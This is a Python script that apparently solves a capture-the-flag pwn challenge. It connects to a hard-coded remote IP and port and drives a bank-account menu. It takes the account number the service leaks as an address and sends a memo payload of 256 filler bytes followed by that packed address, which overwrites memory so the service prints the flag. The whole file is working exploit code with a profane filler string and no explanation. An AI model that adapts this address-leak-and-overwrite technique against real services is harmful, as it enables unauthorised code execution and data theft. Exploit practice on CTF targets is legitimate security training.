import socket
import time
import sys
import struct

SLEEP = 0.5

def get_hex(addr):
	addr="\""+str(repr(struct.pack('I', addr))[2:-1])+"\""
	return(eval(str(addr)))

def find_addr(s):
    if (s.find("thank you, your account number")!=-1):
        num=""
        pos=s.find("thank you, your account number")+31
        while (s[pos]!='.'):
            num+=s[pos]
            pos+=1
        print(num)
        return num
    return None

def receive_message(socket):
    c=socket.recv(1024)
    print(c)
    string=str(c, "utf-8")
    print("RECEIVE:" + string)
    return string.lower()

def send_message(socket, message):
    print("SEND:" + message)
    socket.send((message + "\n").encode('utf-8'))

def exploit(addr):
    payload="fuck"*64+addr
    return payload

mappings = {
    "create account" : "1",
    "first name:" : "just",
    "last name:" : "rubbish",
    "delete account" : "3",
    "add memo" : "4",
    "please enter memo:" : "EXPLOIT",
    "print flag" : "5"
}

addr=""
print("Start exploiting...")
s = socket.create_connection(('165.22.123.95',30996))
for key in mappings.keys():
    mes = receive_message(s)
    if key=="please enter memo:":
        send_message(s, exploit(addr))
    if (find_addr(mes)):
        addr=find_addr(mes)
        addr=get_hex(int(addr))
    if (mes.find(key) != -1):
        send_message(s, mappings[key])
        time.sleep(SLEEP)
mes = receive_message(s)
flag = "COULD NOT EXTRACT FLAG"
for line in mes.split("\n"):
    if "htb" in line:
        flag = "FLAG: " + line
        break
print("%s" % flag)
